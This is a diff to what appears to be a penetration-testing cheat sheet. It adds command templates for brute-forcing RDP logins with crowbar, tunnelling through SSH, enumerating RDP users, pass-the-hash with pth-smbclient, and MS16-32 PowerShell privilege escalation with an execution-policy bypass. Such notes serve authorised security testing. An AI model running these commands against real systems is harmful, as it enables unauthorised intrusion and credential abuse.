@@ -160,6 +160,11 @@ by `-LBr`
 - bruteforce webform username and pw combination
 `> patator http_fuzz url='url' method=POST body='username=COMBO00&password=COMBO01&server=1&target=index.php&lang=en&token=' 0=combos.txt before_urls='url' accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in' `
 
+#### crowbar
+- bruteforce rdp login
+`> crowbar -b rdp -u <user> -C <wordlist> -s <ip/net> -v`
+
+
 #### find / identify hashes
 `> findmyhash <hash>`
 `> hash-identifier <hash>`
@@ -263,6 +268,25 @@ https://nmap.org/nsedoc/scripts/http-form-brute.html
 - display all established and listen tcp connections
 `> netstat -antp`
 
+#### sshuttle
+- route networks through ssh tunnel (with keyfile)
+`> sshuttle -e "ssh -i <key>" -r <user@ip> <x.x.x.1/net> <x.x.x.n/net>`
+
+#### ssh
+- use ssh with key
+`> ssh -i <key> -l <user> <ip> -p <port>`
+
+- redirect port through ssh tunnel
+`> ssh -L <port>:<remote ip>:<port> <ip>`
+
+#### xfreerdp
+- open remote desktop session with shared clipboard
+`> xfreerdp +clipboard /v:<ip> /u:<user> /w:<with> /h:<height>`
+
+- enumerate rdp user
+`> xfreerdp /v:<ip> -sec-nla /u:""`
+
+
 #### openvpn
 - establish vpn connection and open pw protected management port
 `>openvpn —config ‘file’ —management ‘ip’ ‘port’ ‘pwfile’`
@@ -274,6 +298,10 @@ https://nmap.org/nsedoc/scripts/http-form-brute.html
 - copy content from and to using site command
 ` > site cpfr /path/to/file`
 ` > site cpto /path/to/file`
+
+#### smbclient
+- connect to a share
+`> smbclient -L <ip> -U <user>`
 
 #### bridging interfaces
 1. add a bridged interface
@@ -298,6 +326,9 @@ https://nmap.org/nsedoc/scripts/http-form-brute.html
 #### sniff traffic between targets using arp spoofing with ettercap
 `> ettercap –T –w <dumpfile> -M ARP /<target IP>/ /<port>/`
 
+#### pth-toolkit pass the hash
+- pass the hash with pth-smb 
+`> pth-smbclient --user=<user> --pw-nt-hash -m smb3 -L <ip> \\\\<ip>\\<share> <hash e.g. 6361DEA164EE8FE91FE7B117FBC9CA5E>`
 
 -----
 
@@ -423,6 +454,17 @@ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 
 #### exim4 priviledge escalation
 todo
+
+#### MS16-32 Powershell local PrivEsc
+1. ByPass Execution
+`PS> powershell -ExecutionPolicy Bypass`
+
+2. Import MS16-32 Module
+`PS> Import-Module ./file.ps1`
+
+3. Invoke Module
+`PS> Invoke-MS16-32`
+
 
 #### find files with setuid / setgid / r+w permissions
 - find setuid permissions
@@ -600,7 +642,7 @@ or
 		os.system('guake -s' + scripttab)
 
 #### Install additional tools for Kali [sh]
-	> apt-get install steghide hexchat zbartools meld ftp openvpn iftop nload etherape dict-free exiftool exif irssi lynx openvas bettercap bridge-utils
+	> apt-get install steghide hexchat zbartools meld ftp openvpn iftop nload etherape dict-free exiftool exif irssi lynx openvas bettercap bridge-utils crowbar sshuttle ltrace mtrace 
 
 #### startup guake with useful tabs [sh]
 	guake -n k -r "netdiscover"
